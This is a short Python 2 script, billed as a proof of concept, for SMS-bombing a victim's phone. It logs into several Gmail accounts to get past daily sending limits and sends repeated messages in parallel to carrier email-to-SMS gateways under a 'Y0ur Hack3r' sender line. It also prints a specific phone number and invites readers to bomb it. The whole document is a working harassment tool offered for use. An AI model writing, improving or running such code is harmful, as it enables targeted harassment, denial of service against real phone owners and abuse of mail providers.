Code:
#!/usr/bin/python

import smtplib
import multiprocessing
import time
import os
import getpass

os.system("clear")

print "##############################################"
print "\r\n"
print "               Proof of Concept               "
print "            GMAIL Account Required            "
print "\r\n"
print "##############################################"
print "\r\n\r\n"

print "Victim's phone number must have the @txt.att.net, @vtext.com, appended..."
print "Example: 7142359634@vtext.com << Feel free to sms bomb this number."
print "\r\n"

victim = raw_input("Enter Victim Number: ")
message = raw_input("Enter Message: ")
subject = raw_input("Enter Subject: ")
print "Gmail limits outbound messages to 500/day..."
y = int(input("How many unique Gmail accounts do you have/want to use: "))
x = int(input("Text X Times/Gmail Account: "))

user = []
for i in xrange(y):
    user.append(raw_input("Enter Gmail Address: "))

password = []
for i in xrange(y):
    password.append(getpass.getpass('Enter Account Password: '))

#sleeper = int(input("Wait how many seconds between sends: "))

headers = "\r\n".join(["From: Y0ur Hack3r",
        "To: " + victim,
        "Subject: " + subject])

#time.sleep(10)
print "############### Send Initiating ###############"

def send_sms(user,password):
    print "Connecting to Gmail with ", user
    count = 0
    session = smtplib.SMTP('smtp.gmail.com',587)
    session.ehlo()
    session.starttls()
    session.login(user,password)
    content = headers + "\r\n\r\n" + message
    while count < x:
        session.sendmail(user, victim, content)
        count += 1
        print "[+] ", user, "Sent Message ", count, " times."
#        time.sleep(sleeper)

threads = []

for n in range(2):
    thread = multiprocessing.Process(target=send_sms, args=[user[n],password[n]])

    threads.append(thread)

for t in threads:
    t.start()
    
print "Started..."

for t in threads:
    t.join()

print "Complete."
print "                           Version 1"